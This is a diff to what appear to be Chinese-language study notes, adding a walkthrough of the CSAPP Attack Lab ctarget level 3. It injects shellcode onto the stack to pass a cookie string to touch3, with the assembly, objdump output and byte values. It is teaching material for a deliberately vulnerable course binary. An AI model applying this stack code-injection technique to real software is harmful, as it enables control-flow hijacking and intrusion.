@@ -914,7 +914,7 @@ c0 17 40 00 00 00 00 00       /* address of touch1 */
 
 ![](image/csapp-attacklab-ctarget-level1.png)
 
-#### `ctarget` level 2
+#### 2. `ctarget` level 2
 
 首先从 level 2 的要求中可以了解到，我们需要让 `ctarget` 程序执行到 `touch2` 程序当中。同时在执行 `touch2` 之前，需要将 `cookie` 信息作为参数传入到寄存器 `%rdi` 当中。
 
@@ -953,6 +953,46 @@ objdump -d level2.o > level2.d
 那么就有了注入的代码段，接着将其保存在 `level2.txt` 当中，然后运行：
 
 ![](image/csapp-attacklab-ctarget-level2.png)
+
+#### 3. `ctarget` level 3
+
+level 3 的大致要求与 level 2 是一致的。只不过在这里要求传入的参数为 cookie 字符串。为了传入这个字符串，我们需要将 cookie 存入到栈上空间。但是栈的空间在本次是随机的，因此我们需要将这个 cookie 信息存入到一个安全的位置。因此将 cookie 字符串的信息存入到返回地址之后，这样就不会被其它程序所修改。所以 cookie 字符串信息将会保存在离栈顶距离为 `0x28 + 0x8` 字节处位置。其中 `0x28` 字节是由 `getbuf` 分配的栈空间，而 `0x8` 是返回地址所占的空间。所以存储位置为 `0x5561dc78 + 0x28 = 0x5561dca8`
+
+根据提示，我们需要将 cookie 字符串以 ASCII 的形式存储，因此将其存储为：
+
+```
+35 39 62 39 39 37 66 61       /* ascii code for 59b997fa */
+```
+
+同 level 2，接下来往栈顶中写入需要执行的代码（保存为 `level3.s`）：
+
+```assembly
+movq $0x5561dca8, %rdi
+pushq $0x4018fa
+retq
+```
+
+接着对其进行汇编得到 `level3.o`，然后再将 `level3.o` 反汇编成为 `level3.d`：
+
+```bash
+gcc -c level3.s
+objdump -d level3.o > level3.d
+```
+
+得到：
+
+```assembly
+0000000000000000 <.text>:
+   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
+   7:	68 fa 18 40 00       	pushq  $0x4018fa
+   c:	c3                   	retq   
+```
+
+那么就有了注入的代码段，接着将其保存在 `level3.txt` 当中，然后运行：
+
+![](image/csapp-attacklab-ctarget-level3.png)
+
+
 
 ### Shell Lab
 
